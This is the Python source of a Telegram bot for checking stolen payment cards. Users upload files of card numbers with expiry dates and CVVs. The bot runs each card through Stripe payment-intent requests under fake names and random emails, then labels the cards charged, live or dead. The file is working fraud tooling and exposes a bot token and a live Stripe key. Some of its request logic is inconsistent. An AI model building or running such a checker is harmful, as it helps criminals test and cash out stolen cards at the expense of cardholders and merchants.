# pylint:disable=W0703
# pylint:disable=W0603

import os

import telebot, requests, random, string, json, csv


bot_token = "8559867395:AAGblvCpn02SZB72OfWLK60InRjckq6mF74"
bot = telebot.TeleBot(bot_token)

session = requests.Session()
is_card_checking = False

def load_allowed_user_ids():
    allowed_user_ids = []
    with open('IDs.csv', 'r') as csvfile:
        reader = csv.reader(csvfile)
        for row in reader:
            allowed_user_ids.append(row[0])
    return allowed_user_ids

def is_user_allowed(user_id):
    allowed_user_ids = load_allowed_user_ids()
    return str(user_id) in allowed_user_ids
@bot.message_handler(commands=['start'])
def handle_sonik_command(message):
        bot.reply_to(message, '---- 𝑊𝐸𝐿𝐶𝑂𝑀𝐸 𝑃𝑅𝑂 ----\n\nᴛᴏ ѕʜᴏᴡ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅs ѕᴇɴᴅ\n\n------>   /help   <-------\n\nᴛᴏ ᴄᴏɴᴛᴀᴄᴛ ᴛʜᴇ ᴅᴇᴠ: sonik\n━━━━━━━━━━━━━━\nᴜѕᴇʀ -> @W_W0_W')
        
        
        
        
        
@bot.message_handler(commands=['help'])
def handle_sonik_command(message):
        bot.reply_to(message, '━━━━━━━━━━━━━━━━\n│🤖 Bot Status ⇾ On✅│\n━━━━━━━━━━━━━━━━\n\n𝐻𝐸𝐿𝐿𝑂 𝐵𝑅𝑂 𝑆𝑃𝐸𝐴𝐾 𝐴𝐷𝑀𝐼𝑁 𝑆𝑈𝐵𝑆𝐶𝑅𝐼𝐵𝐸 𝐵𝑂𝑇  -> @W_W0_W  🝓\n\n━━━━━━━━━━━━━━━━━━━━━━━━\n𝙱𝙾𝚃 𝙱𝚈 -> SONIK │ @W_W0_W 𖣐')
        
        
        
        
@bot.message_handler(commands=['CC'])
def handle_check_command(message):
    if not is_user_allowed(message.from_user.id):
        bot.reply_to(message, "𝐻𝐸𝐿𝐿𝑂 𝐵𝑅𝑂 𝑆𝑃𝐸𝐴𝐾 𝐴𝐷𝑀𝐼𝑁 𝑆𝑈𝐵𝑆𝐶𝑅𝐼𝐵𝐸 𝐵𝑂𝑇  -> @W_W0_W")
        return

    bot.reply_to(message, "ابعت كومبو واحد ومتصدعنيش🙂😂.")
    global is_card_checking
    is_card_checking = True

    @bot.message_handler(content_types=['document'])
    def handle_card_file(message):
        try:
            file_id = message.document.file_id
            file_info = bot.get_file(file_id)
            file_path = file_info.file_path

            cards = []

            downloaded_file = bot.download_file(file_path)

            file_content = downloaded_file.decode('utf-8')
            card_lines = file_content.strip().split('\n')

            for line in card_lines:
                card_data = line.strip().split('|')

                if len(card_data) != 4:
                    bot.reply_to(message, f"Invalid card details format in line: {line}")
                    continue

                cc, mes, ano, cvv = map(str.strip, card_data)
                cards.append((cc, mes, ano, cvv))

            check_cards_from_file(message, cards)

        except Exception as e:
            bot.reply_to(message, "An error occurred while processing your request.")
            print(str(e))

def check_cards_from_file(message, cards):
    try:
        not_working_cards = []
        working_cards = []
        insufficient_funds = []

        msg = bot.send_message(chat_id=message.chat.id, text="انا بفحصلك اهو روح العب بعيد 💣")

        for cc, mes, ano, cvv in cards:
            if not is_card_checking:
                break

            email = generate_email()
            card = f"{cc}|{mes}|{ano}|{cvv}"
            url = "https://api.stripe.com/v1/payment_methods"
            data = {
                "orderDetails": {
                    "quantity": 1,
                    "purchaserName": "jaren jasef",
                    "forOption": "SomeoneElse",
                    "giftCardRecipient": "SomeoneElse",
                    "itemName": "1 x Gift card",
                    "itemId": "ac0e43f5-3d8e-452f-bfc1-08d91ec715f7",
                    "customDenominationValue": "1",
                    "serviceFee": 0,
                    "itemTotal": 1,
                    "discount": 0,
                    "subTotal": 1,
                    "tipValue": None,
                    "total": 1,
                    "promoCode": "",
                    "language": "en-GB",
                    "shippingOptionId": None,
                    "artworkUrl": "https://cdn.giftup.app/assets/a4b0120c-9622-4821-a057-11a45c41adc9/artwork-64a4243c-98cb-4297-9f1d-58d48cdb8137.png?cb=b2ca77d4-7edc-4792-82b8-62275c258c13",
                    "customFields": [],
                    "companyName": "The Wet Fish Cafe",
                    "currency": "GBP",
                    "turnstileToken": "",
                    "hCaptchaToken": "",
                    "fulfilmentMethod": "Email",
                    "recipientName": "jaren jase",
                    "recipientEmail": "jarenjase1@gmail.com"
                }
            }

            headers = {
                'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'            }

            response = session.post(url, json=data, headers=headers)
            response_data = response.json()
            pi = response_data.get("id")
            cs = response_data.get("clientSecret")

            F = 'Mostafa'
            L = 'Ashry'
            zip_code = '10080'
            country = 'US'

            time = '45678'
            guid = 'NA'
            muid = 'NA'
            sid = 'NA'
            url = f'https://api.stripe.com/v1/payment_intents/{pi}/confirm'

            data = {
                "payment_method_data[billing_details][name]": f"{F} {L}",
                "payment_method_data[billing_details][email]": email,
                "payment_method_data[billing_details][address][postal_code]": zip_code,
                "payment_method_data[billing_details][address][country]": country,
                "payment_method_data[type]": "card",
                "payment_method_data[card][number]": cc,
                "payment_method_data[card][cvc]": cvv,
                "payment_method_data[card][exp_year]": ano,
                "payment_method_data[card][exp_month]": mes,
                "payment_method_data[pasted_fields]": "number",
                "payment_method_data[payment_user_agent]": "stripe.js/f628f6b3f9; stripe-js-v3/f628f6b3f9; payment-element",
                "payment_method_data[time_on_page]": time,
                "payment_method_data[guid]": guid,
                "payment_method_data[muid]": muid,
                "payment_method_data[sid]": sid,
                "expected_payment_method_type": "card",
                "use_stripe_sdk": "true",
                'key': 'pk_live_hxXuNSAJWiHCGnvDBfdtKBIL00kTjSeSNM',
    'is_stripe_sdk': 'false',
    'client_secret': 'pi_3NSRIAHtMN8eOiDR07tx1mIb_secret_jzdeNeOHfSYqa6eRgslEudG8y',
                "client_secret": cs
            }

            

            response = session.post(url, data=data)
            response_data = json.loads(response.text)

            if 'error' in response_data:
                error_message = response_data['error']['message']
                if error_message == 'Your card was declined.':
                    not_working_cards.append(card)
                elif error_message == 'Your card has insufficient funds.':
                    insufficient_funds.append(card)
                    bot.reply_to(message, f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n\n𝗖𝗖 ⇾ {card} \n[🔌]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ STRIPE\n[📧]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ [ insufficient_funds! ]\n\n\n𝙱𝙾𝚃 𝙱𝚈 -> SONIK │ @W_W0_W 𖣐")
                else:
                    not_working_cards.append(card)
            elif response.status_code != 200:
                not_working_cards.append(card)
                
            elif "status" in response_data and response_data["status"] == "requires_action":
                	not_working_cards.append(card)
            else:
                working_cards.append(card)
                bot.reply_to(message, f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n\n𝗖𝗖 ⇾ {card} \n[🔌]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ STRIPE\n[📧]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ [ CHARGED! ]\n\n\n𝙱𝙾𝚃 𝙱𝚈 -> SONIK │ @W_W0_W 𖣐")

            reply_markup = create_reply_markup(card, len(not_working_cards), len(working_cards), len(insufficient_funds))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text="هاتلي ببسي ابلع الاكل 💣🤑",
                                  reply_markup=reply_markup)

    except Exception as e:
        bot.reply_to(message, "حدث خطا حاول مجدداً .🌿♥️.")
        print(str(e))


def generate_email():
    domains = ['gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com']
    domain = random.choice(domains)
    username = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
    email = username + '@' + domain
    return email


def create_reply_markup(current_card, num_not_working, num_working, num_insufficient):
    markup = telebot.types.InlineKeyboardMarkup()

    current_card_button = telebot.types.InlineKeyboardButton(text=f"{current_card}", callback_data="current_card")

    working_button = telebot.types.InlineKeyboardButton(text=f"[😈] 𝐶𝐻𝐴𝑅𝐺𝐸𝐷 : {num_working}", callback_data="working")

    insufficient_funds_button = telebot.types.InlineKeyboardButton(text=f"[🌝] 𝐿𝐼𝑉𝐸 / 𝐼𝑁𝐹 : {num_insufficient}", callback_data="insufficient_funds")

    not_working_button = telebot.types.InlineKeyboardButton(text=f"[❌] 𝐷𝐸𝐴𝐷 : {num_not_working}", callback_data="not_working")

    stop_button = telebot.types.InlineKeyboardButton(text="[🌜] 𝑆𝑇𝑂𝑃 [🌛] ", callback_data="stop")

    markup.row(current_card_button)
    markup.row(working_button)
    markup.row(insufficient_funds_button)
    markup.row(not_working_button)
    markup.row(stop_button)

    return markup


@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    if call.data == "current_card":
        pass
    elif call.data == "not_working":
        pass
    elif call.data == "working":
        pass
    elif call.data == "stop":
        global is_card_checking
        is_card_checking = False
        bot.answer_callback_query(call.id, text="تم ايقاف الفحص يا جميل 😚🌹")


bot.polling()
